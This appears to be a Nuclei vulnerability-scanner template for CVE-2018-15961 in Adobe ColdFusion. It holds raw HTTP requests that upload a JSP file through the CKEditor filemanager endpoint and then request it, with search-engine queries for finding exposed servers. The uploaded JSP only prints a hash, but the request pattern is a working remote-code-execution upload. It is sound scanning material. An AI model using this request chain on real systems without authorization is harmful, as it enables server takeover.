http:
- matchers:
  - type: word
    words:
    - ddbb3e76f92e78c445c8ecb392beb225
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1\n\
    Host: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------24464570528145\n\
    \n-----------------------------24464570528145\nContent-Disposition: form-data;\
    \ name=\"file\"; filename=\"{{randstr}}.jsp\"\nContent-Type: image/jpeg\n\n<%@\
    \ page import=\"java.util.*,java.io.*\"%>\n<%@ page import=\"java.security.MessageDigest\"\
    %>\n<%\nString cve = \"CVE-2018-15961\";\nMessageDigest alg = MessageDigest.getInstance(\"\
    MD5\");\nalg.reset();\nalg.update(cve.getBytes());\nbyte[] digest = alg.digest();\n\
    StringBuffer hashedpasswd = new StringBuffer();\nString hx;\nfor (int i=0;i<digest.length;i++){\n\
    \  hx =  Integer.toHexString(0xFF & digest[i]);\n  if(hx.length() == 1){hx = \"\
    0\" + hx;}\n  hashedpasswd.append(hx);\n}\nout.println(hashedpasswd.toString());\n\
    %>\n-----------------------------24464570528145\nContent-Disposition: form-data;\
    \ name=\"path\"\n\n{{randstr}}.jsp\n-----------------------------24464570528145--\n"
  - 'GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2018-15961
info:
  author: SkyLark-Lab,ImNightmaree
  classification:
    cpe: cpe:2.3:a:adobe:coldfusion:11.0:-:*:*:*:*:*:*
    cve-id: CVE-2018-15961
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.99977
    epss-score: 0.94422
  description: Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update
    6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability.
    Successful exploitation could lead to arbitrary code execution.
  impact: 'Successful exploitation of this vulnerability can result in remote code
    execution, allowing an attacker to take control of the affected system.

    '
  metadata:
    fofa-query:
    - title="coldfusion administrator login"
    - app="adobe-coldfusion"
    google-query: intitle:"coldfusion administrator login"
    max-request: 2
    product: coldfusion
    shodan-query:
    - http.component:"Adobe ColdFusion"
    - http.component:"adobe coldfusion"
    - http.title:"coldfusion administrator login"
    - cpe:"cpe:2.3:a:adobe:coldfusion"
    vendor: adobe
  name: Adobe ColdFusion - Unrestricted File Upload Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2018-15961
  - https://github.com/xbufu/CVE-2018-15961
  - https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html
  - http://web.archive.org/web/20220309060906/http://www.securitytracker.com/id/1041621
  - http://www.securitytracker.com/id/1041621
  remediation: 'Apply the necessary security patches or updates provided by Adobe
    to fix this vulnerability.

    '
  severity: critical
  tags: cve,cve2018,adobe,rce,coldfusion,fileupload,kev,intrusive,vkev,vuln
